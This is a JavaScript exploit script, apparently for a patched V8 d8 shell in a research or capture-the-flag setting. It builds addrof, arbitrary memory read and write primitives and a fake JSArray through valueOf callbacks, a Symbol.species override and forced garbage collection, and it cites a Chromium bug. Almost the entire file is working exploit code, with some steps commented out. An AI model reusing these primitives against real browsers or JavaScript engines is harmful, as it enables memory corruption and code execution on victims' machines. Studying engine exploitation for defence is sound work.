class Helpers {
    constructor() {
        this.buf = new ArrayBuffer(8);
        this.f64 = new Float64Array(this.buf);
        this.u32 = new Uint32Array(this.buf);
        this.u64 = new BigUint64Array(this.buf);
    }
    ftoil(f) {
        this.f64[0] = f;
        return this.u32[0]
    }
    ftoih(f) {
        this.f64[0] = f;
        return this.u32[1]
    }
    ftoll(f) {
        this.f64[0] = f;
        return this.u64[0];
    }
    lltof(f) {
        this.u64[0] = f;
        return this.f64[0];
    }
    hex(val) {
        return '0x' + val.toString(16).padStart(16, '0');
    }
    addrof(object) {
        this.pointer_array[0] = object;
        this.fake_obj[2] = this.lltof(this.pointer_array_buffer_addr);
        return this.ftoll(this.target_array[0]);
    }
    arbread(addr) {
        this.fake_obj[2] = this.lltof(addr - 0x10n + 1n);
        var val = this.ftoll(this.target_array[0]);
        console.log("[+] read > " + this.hex(addr) + " = " + this.hex(val));
        return val;
    }
    arbwrite(addr, data) {
        this.fake_obj[2] = this.lltof(addr - 0x10n + 1n);
        this.target_array[0] = this.lltof(data);
        console.log("[*] write > " + this.hex(addr) + " = " + this.hex(data));
        return;
    }
    pad(num, len) {
        return num.toString().padStart(len, ' ');
    }
    put_array_info(name, arr, offset) {
        console.log("==================================================");
        console.log("[+] " + name + " map: " + this.hex(this.ftoll(arr[offset])));
        console.log("[+] " + name + " property: " + this.hex(this.ftoll(arr[offset + 1])));
        console.log("[+] " + name + " element: " + this.hex(this.ftoll(arr[offset + 2])));
        console.log("[+] " + name + " length: " + this.hex(this.ftoih(arr[offset + 3])));
        console.log("==================================================");
    }
    put_array_buffer(name, arr, offset) {
        console.log("==================================================");
        var len = this.ftoih(arr[offset + 1])
        console.log("[+] " + name + " map: " + this.hex(this.ftoll(arr[offset])));
        console.log("[+] " + name + " length: " + this.hex(this.ftoih(arr[offset + 1])));
        console.log("[+] " + name + " elements: ");
        for (var i = 0; i < len; i++) {
            console.log("    [" + this.pad(i, 2) + "]: " + this.hex(this.ftoll(arr[offset + 2 + i])));
        }
        console.log("==================================================");
    }
}


console.log("[*] Setting up helper...");
var helper = new Helpers();
class LeakTypedArray extends Float64Array { }

const setup = () => {
    let lta = new LeakTypedArray(1024);
    lta.__defineSetter__('length', function () { })

    let x = {};
    let a = [];
    for (let i = 0; i < 99; i++) {
        a.push(i);
    }
    a.push(x);
    
    x.valueOf = () => {
        console.log("valueOf");
        /* shrink z */
        a.length = 5;
        /* trigger gc */
        new ArrayBuffer(0x7fe00000);
        return 1337;
    };
    
    var fake_obj = [
        1.1, 2.2, 3.3, 4.4,
        5.5, 6.6, 7.7, 8.8,
        9.9, 1.1, 2.2, 3.3,
        4.4, 5.5, 6.6, 7.7, 8.8
    ]; // DOUBLE_ELEMENTS

    var pointer_array = [{}, 0, 0, 0, 0, 0, 0, 0];
    // SLOW_ELEMENTS
    // used for getting address of any object

    // const C = new Function();
    // C.__defineGetter__(Symbol.species, () => {
    //     return function () { return lta; }
    // });
    // a.constructor = C;

    // define callback
    
    console.log("[+] Source array length: " + a.length);
    
    // use concat to trigger the callback
    var result = a.numerify();
    %DebugPrint(a);
    helper.arr_map = result[1];
    helper.arr_property = result[2];
    helper.arr_element = result[3];
    helper.arr_length = result[4];

    // console.log("[+] Concatenated array: " + result);
    helper.put_array_info("Leaked array", result, 1);

    element = helper.ftoll(result[3]);
    console.log("[+] Element buffer: " + helper.hex(element));

    // get the fake object
    helper.fake_obj = fake_obj;
    // use gdb and breakpoint to get following offsets
    helper.fake_obj_arr_addr = element + 0xd0n;
    helper.fake_obj_arr_buffer_addr = element + 0x38n;
    /*
        - fake_obj:
          buffer: element 5-23
            map : element 5
            len : element 6 [high]
            eles: element 7-23
          map   : element 24
          prop  : element 25
          ele   : element 26
          len   : element 27 [high]
    */

    console.log("[+] Fake object address: " + helper.hex(helper.fake_obj_arr_addr));
    console.log("[+] Fake object buffer address: " + helper.hex(helper.fake_obj_arr_buffer_addr));

    // helper.put_array_info("Fake object", result, 0x18);
    // helper.put_array_buffer("Fake object buffer", result, 5);

    // get the pointer array just like before
    helper.pointer_array = pointer_array;
    helper.pointer_array_addr = element + 0x168n;
    helper.pointer_array_buffer_addr = element + 0xf0n;

    // console.log("[+] Pointer array address: " + helper.hex(helper.pointer_array_addr));
    // console.log("[+] Pointer array buffer address: " + helper.hex(helper.pointer_array_buffer_addr));

    // helper.put_array_info("Pointer array", result, 0x2d);
    // helper.put_array_buffer("Pointer array buffer", result, 28);
}


const trigger = (addr) => {
    let lta = new LeakTypedArray(1024);
    lta.__defineSetter__('length', function () { })

    var a = [
        1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
        1.1, 3.3, 4.4, 5.5, /**/, 6.6, 7.7, 8.8, 9.9,
        1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
        1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
        1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, {} // SOLW_HOLEY_ELEMENTS
    ];

    // make addr a pointer
    var fake_obj_arr_ptr = [
        addr, addr, addr, addr,
        addr, addr, addr, addr,
        addr, addr, addr, addr,
        addr, addr, addr, addr,
    ]

    const C = new Function();
    C.__defineGetter__(Symbol.species, () => {
        return function () { return lta; }
    });
    a.constructor = C;

    // let v8 think
    // the object at fake_obj_arr_buffer_addr is an array
    helper.fake_obj[0] = helper.arr_map;
    helper.fake_obj[1] = helper.arr_property;
    helper.fake_obj[2] = helper.arr_element;
    helper.fake_obj[3] = helper.arr_length;

    // define callback
    // will meet an error when trying to get value of 'addr'
    // https://bugs.chromium.org/p/chromium/issues/attachmentText?aid=497164
    Array.prototype[13] = {
        valueOf: function () {
            a.length = 1;
            new ArrayBuffer(0x7fe00000);
            Object.prototype.valueOf = function () {
                helper.target_array = this; // grab our fake JSArray
                delete Object.prototype.valueOf; // clean up this valueOf
                throw 'bailout!!!'; // throw to escape Object::ToNumber
                return 42;
            }
            delete Array.prototype[13];
            return 1.1;
        }
    };

    var c = Array.prototype.concat.call(a);
}
try {
    setup();
} catch (e) {
    console.log("[!] " + e);
}


console.log("[+] Crafting fake object...")

// try {
//     // add buffer header length (0x10)
//     trigger(helper.lltof(helper.fake_obj_arr_buffer_addr + 0x10));
// } catch (e) {
//     console.log("[!] " + e);
// }